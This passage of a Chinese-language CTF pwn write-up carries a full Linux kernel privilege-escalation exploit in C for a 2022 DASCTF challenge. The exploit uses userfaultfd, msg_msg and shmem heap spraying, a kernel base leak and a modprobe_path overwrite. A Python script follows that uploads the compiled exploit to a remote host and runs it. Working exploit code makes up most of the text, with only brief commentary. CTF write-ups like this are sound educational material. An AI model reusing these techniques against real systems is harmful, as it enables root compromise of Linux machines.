    }
    // handler
    if (args->func)
    {
        args->func(page, args->func_args);
    }
    else
    { // copy
        memcpy(page, args->func_args, PAGE_SIZE);
    }

    uc.src = (unsigned long)page;
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    info("stuck handler done");
    process_userfault_running = 0;
    return NULL;
}
```

`exp.c`：

```c
#include "helpful.h"

#define SU_message_set_flag 0x2001
#define SU_message_set_string 0x2002
#define SU_message_release 0x2003
#define MSG_COPY 040000

#define KERNEL_BASE_ADDRESS 0xffffffff81000000
#define MESSAGE_LIST_ADDR 0xffffffff832acba0

const char const * hacked_path = "/tmp/you_are_hacked";

size_t modprobe_path_offset = 0xffffffff82c6c360 - 0xffffffff81000000;
int qids[0x1000];
int g_count = 0;

extern size_t *g_buffer;
extern ssize_t process_userfault_running;

struct SU_message_context
{
    char *message_name;
    unsigned int size;
    int type;
    char *message_content;
    unsigned int message_len;
};

int make_queue(key_t key, int msgflg)
{
    int result;
    if ((result = msgget(key, msgflg)) == -1)
    {
        error("msgget error!");
    }
    return result;
}

void send_msg(int msqid, size_t total_size, long type, int msgflg)
{
    struct
    {
        long type;
        char data[total_size - 0x30];
    } msg;
    msg.type = type;
    memset(msg.data, 'A' - 1 + type, sizeof(msg.data));

    if (msgsnd(msqid, &msg, sizeof(msg.data), msgflg) == -1)
    {
        error("msgsend error!");
    }
}

void send_msg2(int msqid, void *msgmsg, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgmsg, msgsz, msgflg) == -1)
    {
        error("msgsend error!");
    }
}

ssize_t get_msg(int msqid, size_t total_size, long msgtyp, int msgflg)
{
    clear_buffer();
    struct
    {
        long type;
        char data[total_size - 0x30];
    } msg;
    msg.type = msgtyp;
    ssize_t result = -1;
    result = msgrcv(msqid, &msg, total_size - 0x30, msgtyp, msgflg);
    if (result < 0)
    {
        warn("msgrcv error!");
        return result;
    }
    memcpy(g_buffer, msg.data, total_size - 0x30);
    return result;
}

void heap_spray_shmem(int count)
{
    int shmid;
    char *shmaddr;
    for (int i = 0; i < count; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
        {
            error("shmget error");
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void *)-1)
        {
            error("shmat error");
        }
    }
    success("heap spray shmem done!");
}

void heap_spray_msg_msg(size_t total_size, size_t num, int add2array)
{
    for (size_t i = 0; i < num; ++i)
    {
        int qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(qid, total_size, 1, 0);
        if (add2array)
        {
            qids[g_count++] = qid;
        }
    }
    success("heap spray msg_msg done!");
}

int SU_message_open()
{
    int fd = syscall(1000, "roderick", 0);
    if (fd < 0)
    {
        error("SU_message_open error!");
    }
    return fd;
}

int SU_message_config(int fd, int cmd, char *key, char *value)
{
    int res = syscall(1001, fd, cmd, key, value);
    if (res < 0)
    {
        error("SU_message_config error!");
    }
    return res;
}

// make message_context->message_len == 0xfff
int fill_message_context()
{
    char key[0x100];
    int fd = SU_message_open();
    memset(key, 'a' + fd, 255);
    for (size_t i = 0; i < 0xf; i++)
    {
        SU_message_config(fd, SU_message_set_flag, key, NULL);
    }
    memset(key, 0, 256);
    memset(key, 'a' + fd, 254);
    SU_message_config(fd, SU_message_set_flag, key, NULL);
    success("fill_message_context, fd: %d, filled char: %c", fd, fd + 'a');
    return fd;
}

size_t _leak_kernel_base()
{
    size_t kernel_base = -1;
    // 1. 堆喷
    heap_spray_msg_msg(PAGE_SIZE + 0x18, 0x40, 1);
    // 2. 分配 message_context
    int fd = fill_message_context();
    // 3. 堆喷 msg_msg和shmeme
    heap_spray_msg_msg(PAGE_SIZE + 0x18, 0x40, 1);
    heap_spray_shmem(0x200);
    // 4. 溢出修改大小
    char overlap[0x20] = {0};
    memset(overlap, 'a', 0x18);
    *((size_t *)(overlap + 0x18)) = 0x1608;
    SU_message_config(fd, SU_message_set_flag, overlap, NULL);
    // 5. 获取消息并检测, 只拷贝不释放
    for (size_t i = 0; i < g_count; i++)
    {
        int res = get_msg(i, 0x1608 + 0x30, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        if (res < 0)
            continue;

        size_t *tmp = g_buffer + (0x1020 / 8);
        for (size_t j = 0; j < 0x200; j++)
        {
            size_t cur_val = *tmp;
            ++tmp;

            if (cur_val > KERNEL_BASE_ADDRESS)
            {
                // info("leak a kernel addr: 0x%lx", cur_val);
                size_t offset = -1;
                if (((cur_val - 0x1e24f40) & 0xfffff) == 0)
                {
                    offset = 0x1e24f40;
                }
                else if (((cur_val - 0x103b8c0) & 0xfffff) == 0)
                {
                    offset = 0x103b8c0;
                }
                else if (((cur_val - 0x1e403a0) & 0xfffff) == 0)
                {
                    offset = 0x1e403a0;
                }
                else if (((cur_val - 0x1e40180) & 0xfffff) == 0)
                {
                    offset = 0x1e40180;
                }
                else if (((cur_val - 0x241620) & 0xfffff) == 0)
                {
                    offset = 0x241620;
                }
                else if (((cur_val - 0x1dc06a0) & 0xfffff) == 0)
                {
                    offset = 0x1dc06a0;
                }
                else if (((cur_val - 0x23bfde0) & 0xfffff) == 0)
                {
                    offset = 0x23bfde0;
                }
                else if (((cur_val - 0x1f62940) & 0xfffff) == 0)
                {
                    offset = 0x1f62940;
                }
                else if (((cur_val - 0x1e42020) & 0xfffff) == 0)
                {
                    offset = 0x1e42020;
                }
                else if (((cur_val - 0x1036fa0) & 0xfffff) == 0)
                {
                    offset = 0x1036fa0;
                }
                if (offset != -1)
                {
                    kernel_base = cur_val - offset;
                }
                if (kernel_base != -1)
                {
                    success("leak kernel base addr: 0x%lx", kernel_base);
                    return kernel_base;
                }
            }
        }
    }
    fail("failed to get kernel base!");
    return kernel_base;
}

size_t leak_kernel_base()
{
    size_t kernel_base = -1;
    do
    {
        kernel_base = _leak_kernel_base();
    } while (kernel_base == -1);
    return kernel_base;
}


void write_modprobe(size_t kernel_base)
{
// write mod
    pthread_t threads[0x100];
    void *copy_src_page = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    void *used_page = mmap(0xdead0000, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    void *stuck_page = mmap(0xdead1000, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfault(stuck_page, &userfaultfd_stuck_handler, NULL, copy_src_page);

    *((char *)used_page + 0xff8) = 1; // type
    memset(copy_src_page, '0', 0xfd0);
    strcpy((char *)copy_src_page + 0xfd0, hacked_path);

    typedef struct
    {
        void *msgbuf;
        size_t msgsz;
    } CurArgs;

    void spray(void *args)
    {
        CurArgs *curargs = (CurArgs *)args;
        int qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg2(qid, curargs->msgbuf, curargs->msgsz, 0);
    }
    
    // 堆喷
    heap_spray_msg_msg(PAGE_SIZE, 0x40, 0);

    int fd = fill_message_context();
    size_t* overlapped[5] = {0};
    memset(overlapped, 'a', 0x20);
    overlapped[4] = kernel_base + modprobe_path_offset - 8;
    info("modprobe_path address: 0x%lx", kernel_base + modprobe_path_offset);

    CurArgs *used_args = (CurArgs *)calloc(sizeof(CurArgs), 1);
    used_args->msgbuf = (size_t)used_page+0xff8;
    used_args->msgsz = 0xfd0+0x18;
    for (size_t i = 0; i < 0x100; i++)
    {
        pthread_create(&threads[i], NULL, spray, (void *)used_args);
    }
    sleep(2);
    SU_message_config(fd, SU_message_set_flag, overlapped, NULL);
    process_userfault_running = 1;

    for (size_t i = 0; i < 0x100; i++)
    {
        pthread_join(threads[i], NULL);
    }
}


void read_flag()
{
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    char buf[0x100] = {0};
    sprintf(buf, "echo '#!/bin/sh\nchmod 777 /flag\n' > %s", hacked_path);
	system(buf);
	system("chmod +x /tmp/you_are_hacked");
	system("chmod +x /tmp/dummy");
	system("/tmp/dummy");
    system("cat /flag");
}


void main()
{
    size_t kernel_base = leak_kernel_base();
    write_modprobe(kernel_base);
    read_flag();
}
```

本地的效果如下：

![image-20220410002106584](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220410002106584.png)

最后打远程使用的`exp.py`：

```python
from pwncli import *

context.update(log_level='error', os='linux', arch='amd64', endian='little', newline='\r\n')

os.system("gcc exp.c -o exp -lpthread -w -O0")
os.system("strip ./exp")
os.system("tar -czvf exp.tar.gz ./exp")
data = b64e(read("./exp.tar.gz"))

# io = remote("127.0.0.1", 13337)
io = remote("node4.buuoj.cn", "25063")

io.sendlineafter('$ ', "touch /tmp/exp_b64", timeout=30)

length = 0x200
count, remain = divmod(len(data), length)

log_ex(f"count: {count} remain: {remain}")
sleep(1)
for i in range(count):
    log_ex(f"current round: {i}/{count}")
    sd = data[i * length: i * length + length]
    io.sendlineafter('$ ', f"echo {sd} >> /tmp/exp_b64", timeout=5)

if remain:
    io.sendlineafter('$ ', f"echo {data[-remain:]} >> /tmp/exp_b64", timeout=5)

sleep(3)
io.recv(timeout=60)

sleep(1)
io.sendline("base64 -d /tmp/exp_b64 > /tmp/exp.tar.gz")
sleep(1)
io.sendline("tar -xvf /tmp/exp.tar.gz -C /tmp")
sleep(1)
io.sendline("chmod +x /tmp/exp")
sleep(1)
io.sendline("cd /tmp")


io.interactive()
```

基本试个几次就出来了

远程打：

![image-20220408214413499](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220408214413499.png)



#### tips

补充一个小技巧，有时候使用普通用户调试内核题，发现目录的权限不对，比如下面这样：

![image-20220410112148482](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220410112148482.png)

那么只需要使用`fakeroot`命令，切换到一个`fake root`账户（原理其实和`docker`差不多，有`namespace`的隔离），再启动就正常了：

![image-20220410112353255](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220410112353255.png)


## 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-03-28-2022dasctfxsu%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/  

